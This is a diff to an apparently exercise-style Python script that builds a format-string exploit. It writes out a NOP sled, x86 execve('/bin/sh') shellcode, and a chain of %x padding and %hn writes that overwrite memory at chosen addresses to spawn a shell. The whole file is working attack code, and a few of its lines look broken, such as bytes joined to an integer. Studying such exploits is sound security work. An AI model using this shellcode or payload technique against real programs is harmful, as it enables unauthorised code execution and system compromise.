@@ -1,6 +1,6 @@
 import sys
 import os
-NOPSLED = b'\x90' * 0x1C
+NOPSLED = b'\x90' * 0x1F
 SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 
 
@@ -9,7 +9,7 @@ ADDRESSOFSHELL = b'\x00\x00\x7F\xFF\xFF\xFF\xD8\x80'
 ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
 ADDRESSOFSHELL.reverse()
 ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
-ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[6:], 'little') + 0x100
+ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[6:], 'little') - 1000
 ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[4:6], 'little')
 ADDRESSOFSHELL3 = int.from_bytes(ADDRESSOFSHELL[2:4], 'little')
 ADDRESSOFSHELL4 = int.from_bytes(ADDRESSOFSHELL[0:2], 'little')
@@ -39,5 +39,5 @@ ADDRESSOFSHELLCODE = bytearray(ADDRESSOFSHELLCODE.to_bytes(8, 'little'))
 LENTGHOFREQUIRED = 316
 
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write(NOPSLED + SHELLCODE + b'%' + ADDRESSOFSHELL1 + b'x.'*286 + b'%hn' + b'%x' + b'%hn' + b'%x' + b'%hn' + b'%x' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + b'\n')
+    stdout.write(NOPSLED + SHELLCODE + b'%x.'*285 + b'%' + b'x.' b'%hn' + b'%x' + b'%hn' + b'%x' + b'%hn' + b'%x' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + b'\n')
     #b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' + b'%hn'+ b'%' + ADDRESSOFSHELL3 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL4 + b'x' + b'%hn' + ADDRESSTOWRITE1 + b'aaaaaaaa' + ADDRESSTOWRITE2 + b'aaaaaaaa' + ADDRESSTOWRITE3 + b'aaaaaaaa' + ADDRESSTOWRITE4 + b'\n')
